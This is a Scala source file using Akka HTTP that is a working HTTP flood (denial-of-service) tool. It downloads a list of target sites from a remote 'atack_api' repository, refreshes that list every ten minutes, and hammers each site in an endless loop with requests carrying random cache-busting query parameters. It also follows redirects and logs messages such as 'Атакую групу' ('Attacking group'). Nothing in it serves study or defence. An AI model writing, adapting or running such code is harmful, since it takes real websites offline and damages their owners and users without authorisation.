package hi

import akka.actor.ActorSystem
import akka.http.scaladsl.Http
import akka.http.scaladsl.model._
import akka.http.scaladsl.settings.ConnectionPoolSettings
import spray.json.DefaultJsonProtocol._
import spray.json._

import scala.concurrent.{ExecutionContextExecutor, Future}
import scala.io.Source
import scala.util.Random

object Test {
  //val file = Source.fromFile("urls.txt").getLines.toList
  //val file = Source.fromURL("https://raw.githubusercontent.com/david-l-books/storage/main/urls.txt").getLines.toList

  case class Proxy(id: Int, ip: String, auth: String) {
    def getIp: String = ip.replace("\r", "").split(":").head

    def port: String = ip.replace("\r", "").split(":")(1)

    def login: String = auth.split(":").head

    def password: String = auth.split(":")(1)
  }

  case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)

  implicit val proxyFormat: RootJsonFormat[Proxy] = jsonFormat3(Proxy)

  implicit object TargetJsonFormat extends RootJsonFormat[Target] {
    override def read(json: JsValue): Target = {
      json.asJsObject.getFields("id", "url", "need_parse_url", "page", "page_time", "atack") match {
        case Seq(JsNumber(id), JsString(url), JsNumber(need_parse_url), JsString(page), page_time, JsNumber(atack)) =>
          Target(id.toInt, url, need_parse_url.toInt, page, page_time.toString(), atack.toInt)
      }
    }

    override def write(obj: Target): JsValue = {
      JsString("")
    }
  }

  def fetchTargets(implicit fmt: RootJsonFormat[Target]): Seq[String] = {
    val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json")
    try {
      source.mkString.parseJson.convertTo[Seq[Target]].filter(_.atack > 0).map(_.url)
    } finally {
      source.close()
    }
  }

  def randomQueryParam(url: String): String = {
    val queryParam = Random.alphanumeric.take(10).mkString + "=" + Random.alphanumeric.take(12).mkString
    if (url.contains("?")) url + "&" + queryParam else url + "?" + queryParam
  }

  val REFRESH_TIME: Int = 10 * 60 * 1000

  var file: Seq[String] = fetchTargets

  var lastUpdate: Long = System.currentTimeMillis()

  def main(args: Array[String]): Unit = {
    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    while (true) {

      if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
        file = fetchTargets
        println(s"list updated. size=${file.size}")
        lastUpdate = System.currentTimeMillis()
      }

      println(s"Атакую групу ${file.mkString("[", ", ", "]")}")

      file.foreach {
        url =>
          innerRequest(url, false)
      }
      Thread.sleep(1000)
    }
  }

  private def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
    val str = randomQueryParam(url)

    Http().singleRequest(HttpRequest(uri = str)).flatMap {
      case HttpResponse(StatusCodes.OK, _, _, _) =>
        if (!recursion) {
          println(s"attack $str")
        } else {
          println(s"attack after redirect $str")
        }

        Future.successful()
      case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
        if (recursion) {
          println(s"too many redirects $url")
          Future.successful()
        } else {
          val link = headers.filter(ss => ss.name().equals("Location"))

          if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != str) {
            innerRequest(link.head.value(), true)
          } else {
            println(s"error redirect $url")
            Future.successful()
          }
        }
      case err =>
        sys.error(s"server is not responding: $err")
    }
  }
}
